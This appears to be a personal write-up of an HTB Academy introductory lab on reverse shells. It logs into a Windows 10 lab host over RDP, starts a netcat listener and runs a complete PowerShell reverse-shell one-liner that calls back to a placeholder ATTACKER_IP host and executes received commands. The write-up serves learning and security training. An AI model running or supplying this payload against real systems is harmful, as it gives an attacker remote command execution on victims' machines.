Reverse Shells – HTB Academy ACADEMY-SHELLS-WIN10

Difficulty: Intro / Learning Category: Tactics / Shells Platform: HTB Academy (Windows 10) Date: March 2026

Short focused lab on understanding reverse shells from a Windows 10 host in HTB Academy, using netcat listeners and PowerShell payloads to get command execution back to my attack box.

📋 Overview

This lab is part of the HTB Academy “Shells & Payloads” module. The goal here is simple: prove I understand what a reverse shell is, set up a listener on my attack box, fire a PowerShell reverse shell from ACADEMY-SHELLS-WIN10, and use the session to retrieve the hostname (shells-Win10).

🔍 Reconnaissance

Since this is an Academy lab, the “recon” is mostly environment awareness: confirm connectivity, log into the Windows target, and identify my own VPN IP for the reverse shell callback.

ip a | grep tun0
Key Finding: My tun0 interface IP is used as LHOST / ATTACKER_IP in all reverse shell payloads. The Windows target must call back to this address, not 127.0.0.1 or its own IP.

🔎 Enumeration

The Academy instructions give direct RDP access to the Windows 10 lab host:

  • Target IP: 10.129.11.9
  • Hostname (later confirmed via reverse shell): shells-Win10
  • Service: RDP (supplied by the lab)
  • Credentials: htb-student / HTB_@cademy_stdnt!
# From my local machine / Pwnbox (using the RDP client provided by HTB or xfreerdp)
xfreerdp /u:htb-student /p:"HTB_@cademy_stdnt!" /v:10.129.11.9

⚡ Exploitation

The “exploit” here is just abusing the fact I have an interactive session on Windows. I start a netcat listener on my attack box, then run a PowerShell reverse shell one-liner from the RDP session back to that listener.

⚠️ Important: In a reverse shell, the victim (Windows box) acts as the client and initiates the connection out to my listener (attacker = server). This is the opposite of a bind shell.

1) Start listener on attack box

# On my HTB attack box (Kali / Pwnbox)
nc -lvnp 4444

2) Trigger PowerShell reverse shell from ACADEMY-SHELLS-WIN10

In the RDP session, open PowerShell or CMD and run the following, replacing ATTACKER_IP with my tun0 IP:

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
Key Behaviour: Once the command runs, the Windows box opens a TCP connection to ATTACKER_IP:4444, and wires that connection to a PowerShell process. Anything I type into netcat is executed on the Windows host.

🎯 Post-Exploitation

After the connection hits my listener, I have a basic interactive PowerShell session. The lab question asks for the hostname of the target machine, which I can now grab over the reverse shell.

# In the netcat session on my attack box
hostname
✅ Success: The command returned shells-Win10, confirming both that the reverse shell worked and that the target host’s name matches the lab question.

📚 Key Learnings

  • In a reverse shell, the target is the client, the attacker is the server/listener.
  • Always use your VPN/tun0 IP for LHOST in HTB labs, not localhost or the target’s IP.
  • A simple netcat listener + PowerShell one-liner is enough to get a usable reverse shell on Windows.
  • Once you have any shell, basic commands like hostname can verify context and answer lab questions quickly.

🛠️ Tools Used

  • Netcat (nc): Used as a TCP listener on my attack box to catch the reverse shell connection.
  • PowerShell: Built-in on Windows 10, used to create the reverse TCP connection back to my listener.
  • RDP client / xfreerdp: To interact with the Windows 10 lab host (ACADEMY-SHELLS-WIN10).
